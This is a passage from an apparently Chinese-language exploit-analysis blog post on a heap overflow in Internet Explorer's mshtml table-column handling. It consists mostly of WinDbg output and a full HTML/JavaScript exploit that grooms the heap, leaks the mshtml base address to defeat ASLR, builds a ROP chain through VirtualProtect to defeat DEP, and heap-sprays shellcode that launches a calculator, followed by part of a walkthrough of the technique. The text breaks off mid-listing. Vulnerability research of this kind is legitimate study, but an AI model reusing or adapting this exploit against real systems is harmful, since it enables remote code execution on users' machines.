class=\"line\">Breakpoint 2 hit</span><br><span class=\"line\">eax=006764f0 ebx=006736f0 ecx=00000032 edx=00000006 esi=006f1848 edi=006764f0</span><br><span class=\"line\">eip=6b60a6cb esp=024ebdec ebp=024ebe94 iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!CTableCol::GetAAspan:</span><br><span class=\"line\">6b60a6cb 8bff            mov     edi,edi</span><br><span class=\"line\">0:005&gt; gu</span><br><span class=\"line\">eax=0000029a ebx=006736f0 ecx=00000002 edx=00682128 esi=006f1848 edi=006764f0</span><br><span class=\"line\">eip=6b81f31f esp=024ebdf0 ebp=024ebe94 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x3ac:</span><br><span class=\"line\">6b81f31f 3de8030000      cmp     eax,3E8h</span><br></pre></td></tr></table></figure>\n<p>eax为0x29a，即666.</p>\n<p>接下来和前面一样是写入样式信息的过程，不过这次是对<strong>只能容纳6个样式信息的堆空间写入了666个样式信息</strong>，从而引发了堆溢出错误。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; dd ebp+0x10</span><br><span class=\"line\">024ebea4  0000029a</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-exp\"><a href=\"#4-exp\" class=\"headerlink\" title=\"4. exp\"></a>4. exp</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"evil\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">style</span>=<span class=\"string\">\"table-layout:fixed\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">col</span> <span class=\"attr\">id</span>=<span class=\"string\">\"132\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"41\"</span> <span class=\"attr\">span</span>=<span class=\"string\">\"9\"</span>&gt;</span>&amp;nbsp;<span class=\"tag\">&lt;/<span class=\"name\">col</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">'javascript'</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//将字符串转换为整数</span></span><br><span class=\"line\"><span class=\"undefined\">function strtoint(str) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    return str.charCodeAt(1)*0x10000 + str.charCodeAt(0);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//初始化布局的字符串变量</span></span><br><span class=\"line\"><span class=\"undefined\">var free = \"EEEE\";</span></span><br><span class=\"line\"><span class=\"xml\">while ( free.length <span class=\"tag\">&lt; <span class=\"attr\">500</span> ) <span class=\"attr\">free</span> += <span class=\"string\">free;</span></span></span></span><br><span class=\"line\"><span class=\"undefined\">var string1 = \"AAAA\";</span></span><br><span class=\"line\"><span class=\"xml\">while ( string1.length <span class=\"tag\">&lt; <span class=\"attr\">500</span> ) <span class=\"attr\">string1</span> += <span class=\"string\">string1;</span></span></span></span><br><span class=\"line\"><span class=\"undefined\">var string2 = \"BBBB\";</span></span><br><span class=\"line\"><span class=\"xml\">while ( string2.length <span class=\"tag\">&lt; <span class=\"attr\">500</span> ) <span class=\"attr\">string2</span> += <span class=\"string\">string2;</span></span></span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">var fr = new Array();</span></span><br><span class=\"line\"><span class=\"undefined\">var al = new Array();</span></span><br><span class=\"line\"><span class=\"undefined\">var bl = new Array();</span></span><br><span class=\"line\"><span class=\"undefined\">var div_container = document.getElementById(\"evil\");</span></span><br><span class=\"line\"><span class=\"undefined\">div_container.style.cssText = \"display:none\";</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//接着按字符串E、字符串A、字符串B、CButtonLayout对象进行堆空间布局</span></span><br><span class=\"line\"><span class=\"xml\">for (var i=0; i <span class=\"tag\">&lt; <span class=\"attr\">500</span>; <span class=\"attr\">i</span>+=<span class=\"string\">2)</span> &#123;</span></span></span><br><span class=\"line\"><span class=\"undefined\">    fr[i] = free.substring(0, (0x100-6)/2);</span></span><br><span class=\"line\"><span class=\"undefined\">    al[i] = string1.substring(0, (0x100-6)/2);</span></span><br><span class=\"line\"><span class=\"undefined\">    bl[i] = string2.substring(0, (0x100-6)/2);</span></span><br><span class=\"line\"><span class=\"undefined\">    var obj = document.createElement(\"button\");</span></span><br><span class=\"line\"><span class=\"undefined\">    div_container.appendChild(obj);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//释放布局后字符串E对应的堆空间</span></span><br><span class=\"line\"><span class=\"xml\">for (var i=200; i<span class=\"tag\">&lt;<span class=\"name\">500;</span> <span class=\"attr\">i</span>+=<span class=\"string\">2</span> ) &#123;</span></span></span><br><span class=\"line\"><span class=\"undefined\">    fr[i] = null;</span></span><br><span class=\"line\"><span class=\"undefined\">    CollectGarbage();</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//进行ROP链中Gadget地址和参数的布局，并与填充数据以及shellcode拼接完成堆喷数据的初始化</span></span><br><span class=\"line\"><span class=\"undefined\">//最后执行堆喷将这些数据布局到内存中</span></span><br><span class=\"line\"><span class=\"undefined\">function heapspray(cbuttonlayout) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    CollectGarbage();</span></span><br><span class=\"line\"><span class=\"undefined\">    //处理各个Gadget的地址信息</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop = cbuttonlayout + 4161; // RET</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop = rop.toString(16);</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop1 = rop.substring(4,8);</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop2 = rop.substring(0,4); // &#125; RET</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    //......省略，可参见https://www.exploit-db.com/exploits/24017/</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    var rop = cbuttonlayout + 408958; // PUSH ESP</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop = rop.toString(16);</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop23 = rop.substring(4,8);</span></span><br><span class=\"line\"><span class=\"undefined\">    var rop24 = rop.substring(0,4); // &#125; RET</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    var shellcode = unescape(\"%u4141%u4141%u4242%u4242%u4343%u4343\"); // PADDING</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u4141%u4141%u4242%u4242%u4343%u4343\"); // PADDING</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u4141%u4141\"); // PADDING</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    //ROP链中的Gadget地址和参数布局，以实现栈转移和DEP绕过</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop1+\"%u\"+rop2); // RETN</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop3+\"%u\"+rop4); // POP EBP # RETN</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop5+\"%u\"+rop6); // XCHG EAX,ESP # RETN</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop3+\"%u\"+rop4); // POP EBP</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop3+\"%u\"+rop4); // POP EBP</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop7+\"%u\"+rop8); // POP EBP</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u1024%u0000\"); // Size 0x00001024</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop9+\"%u\"+rop10); // POP EDX</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u0040%u0000\"); // 0x00000040</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop11+\"%u\"+rop12); // POP ECX</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+writable1+\"%u\"+writable2); // Writable Location</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop13+\"%u\"+rop14); // POP EDI</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop1+\"%u\"+rop2); // RET</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop15+\"%u\"+rop16); // POP ESI</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+jmpeax1+\"%u\"+jmpeax2); // JMP EAX</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop17+\"%u\"+rop18); // POP EAX</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+vp1+\"%u\"+vp2); // VirtualProtect()</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop19+\"%u\"+rop20); // MOV EAX,DWORD PTR DS:[EAX]</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop21+\"%u\"+rop22); // PUSHAD</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u\"+rop23+\"%u\"+rop24); // PUSH ESP</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u9090%u9090\"); // NOPs</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u9090%u9090\"); // NOPs</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%u9090%u9090\"); // NOPs</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    //弹出计算器的shellcode</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= unescape(\"%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5\" + </span></span><br><span class=\"line\"><span class=\"undefined\">                             \"%u6c61%u2e63%u7865%u0065\");</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    //初始化堆喷数据</span></span><br><span class=\"line\"><span class=\"undefined\">    var padding = unescape(\"%u9090\");</span></span><br><span class=\"line\"><span class=\"undefined\">    while (padding.length &lt; 1000)</span></span><br><span class=\"line\"><span class=\"undefined\">        padding = padding + padding;</span></span><br><span class=\"line\"><span class=\"undefined\">    var padding = padding.substr(0, 1000 - shellcode.length);</span></span><br><span class=\"line\"><span class=\"undefined\">    shellcode+= padding;</span></span><br><span class=\"line\"><span class=\"undefined\">    while (shellcode.length &lt; 100000)</span></span><br><span class=\"line\"><span class=\"undefined\">        shellcode = shellcode + shellcode;</span></span><br><span class=\"line\"><span class=\"undefined\">    var onemeg = shellcode.substr(0, 64*1024/2);</span></span><br><span class=\"line\"><span class=\"undefined\">    for (i=0; i&lt;14; i++) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        onemeg += shellcode.substr(0, 64*1024/2);</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    onemeg += shellcode.substr(0, (64*1024/2)-(38/2));</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">    //通过堆喷布局rop和shellcode</span></span><br><span class=\"line\"><span class=\"undefined\">    var spray = new Array();</span></span><br><span class=\"line\"><span class=\"undefined\">    for (i=0; i&lt;100; i++) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        spray[i] = onemeg.substr(0, onemeg.length);</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//触发第一次堆溢出用以获取泄露的mshtml模块基址</span></span><br><span class=\"line\"><span class=\"undefined\">function leak() &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    var leak_col = document.getElementById(\"132\");</span></span><br><span class=\"line\"><span class=\"undefined\">    leak_col.width = \"41\";</span></span><br><span class=\"line\"><span class=\"undefined\">    leak_col.span = \"19\";</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//计算mshtml模块基址，并通过堆喷进行rop和shellcode布局</span></span><br><span class=\"line\"><span class=\"undefined\">function get_leak() &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    var str_addr = strtoint(bl[498].substring((0x100-6)/2+11,(0x100-6)/2+13));</span></span><br><span class=\"line\"><span class=\"undefined\">    str_addr = str_addr - 1410704;</span></span><br><span class=\"line\"><span class=\"undefined\">    setTimeout(function()&#123;heapspray(str_addr)&#125;, 50);</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">//触发第二次堆溢出用以覆盖虚表指针，使程序转到rop处执行</span></span><br><span class=\"line\"><span class=\"undefined\">function trigger_overflow() &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    var evil_col = document.getElementById(\"132\");</span></span><br><span class=\"line\"><span class=\"undefined\">    evil_col.width = \"1278888\";</span></span><br><span class=\"line\"><span class=\"undefined\">    evil_col.span = \"29\";</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">setTimeout(function()&#123;leak()&#125;, 400);</span></span><br><span class=\"line\"><span class=\"undefined\">setTimeout(function()&#123;get_leak()&#125;, 450);</span></span><br><span class=\"line\"><span class=\"undefined\">setTimeout(function()&#123;trigger_overflow()&#125;, 1000);</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"5-利用详解\"><a href=\"#5-利用详解\" class=\"headerlink\" title=\"5. 利用详解\"></a>5. 利用详解</h3><h4 id=\"绕过ASLR\"><a href=\"#绕过ASLR\" class=\"headerlink\" title=\"绕过ASLR\"></a>绕过ASLR</h4><p>读取<strong>mshtml!CButtonLayout对象的vftable值</strong>可以计算出mshtml.dll模块的基地址，因为该值位于此模块中的固定偏移处，所以可被利用以绕过ASLR，计算出mshtml模块的加载基址（类似Glibc中的main arean的地址）。</p>\n<p>最开始需要对堆空间进行布局，关键代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//初始化布局的字符串变量</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> free = <span class=\"string\">\"EEEE\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( free.length &lt; <span class=\"number\">500</span> ) free += free;</span><br><span class=\"line\"><span class=\"keyword\">var</span> string1 = <span class=\"string\">\"AAAA\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( string1.length &lt; <span class=\"number\">500</span> ) string1 += string1;</span><br><span class=\"line\"><span class=\"keyword\">var</span> string2 = <span class=\"string\">\"BBBB\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( string2.length &lt; <span class=\"number\">500</span> ) string2 += string2;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> fr = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\"><span class=\"keyword\">var</span> al = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\"><span class=\"keyword\">var</span> bl = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\"><span class=\"keyword\">var</span> div_container = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"evil\"</span>);</span><br><span class=\"line\">div_container.style.cssText = <span class=\"string\">\"display:none\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//接着按字符串E、字符串A、字符串B、CButtonLayout对象进行堆空间布局</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>; i &lt; <span class=\"number\">500</span>; i+=<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    fr[i] = free.substring(<span class=\"number\">0</span>, (<span class=\"number\">0x100</span><span class=\"number\">-6</span>)/<span class=\"number\">2</span>);</span><br><span class=\"line\">    al[i] = string1.substring(<span class=\"number\">0</span>, (<span class=\"number\">0x100</span><span class=\"number\">-6</span>)/<span class=\"number\">2</span>);</span><br><span class=\"line\">    bl[i] = string2.substring(<span class=\"number\">0</span>, (<span class=\"number\">0x100</span><span class=\"number\">-6</span>)/<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> obj = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"button\"</span>);</span><br><span class=\"line\">    div_container.appendChild(obj);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//释放布局后字符串E对应的堆空间</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">200</span>; i&lt;<span class=\"number\">500</span>; i+=<span class=\"number\">2</span> ) &#123;</span><br><span class=\"line\">    fr[i] = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    CollectGarbage();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述代码中的字符串将会分配到堆空间中，并且被转换为BSTR对象（COM）：此对象包含头部和尾部，字符以UNICODE存储，头部4个字节表示字符串长度，尾部2个字节表示结束。比如执行一次下述代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">al[i] = string1.substring(<span class=\"number\">0</span>, (<span class=\"number\">0x100</span> - <span class=\"number\">6</span>)/<span class=\"number\">2</span>);</span><br></pre></td></tr></table></figure>\n<p>与其对应的内存结构就应该如下</p>\n<p>一块占用0x100的内存空间</p>\n<p>代码在布局时会连续填充字符串，由堆空间管理的性质可知分配的这些堆空间最终会紧挨在一起，因此内存中的分布会如上图那样彼此间相邻。同时，这里还利用了堆空间管理中的另一性质（和Glibc的bin机制相似），即当某块堆空间被释放后如果接下来又有新的申请堆空间操作且此释放掉的空间大小合适，那么会将释放掉的该堆空间重新分配给此时的申请操作。我们注意如下代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">style</span>=<span class=\"string\">\"table-layout:fixed\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">col</span> <span class=\"attr\">id</span>=<span class=\"string\">\"132\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"41\"</span> <span class=\"attr\">span</span>=<span class=\"string\">\"9\"</span>&gt;</span>&amp;nbsp;<span class=\"tag\">&lt;/<span class=\"name\">col</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>就这一块来说，程序将为其分配0x1c*9=0xfc字节大小的堆空间，而在布局时释放掉的那些堆空间大小为0x100字节，所以最后释放掉的那块堆空间将会重新分配来保存column的样式信息。最终内存中的分布会是如下这个样子：</p>\n<p>为了计算mshtml.dll模块的基址，我们需要获取黄色区域标识的vftable数值，这里利用了堆溢出，同样，也是通过js代码动态更新span属性值的方式，修改BSTR对象的的size字段，从而可以按索引越界读取到vftable的值。</p>\n<p>对这一块堆布局的代码调试如下：</p>\n<p>在mshtml!_CTableCol::GetAAspan下断点，追踪esi指针即可定位到堆空间：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span 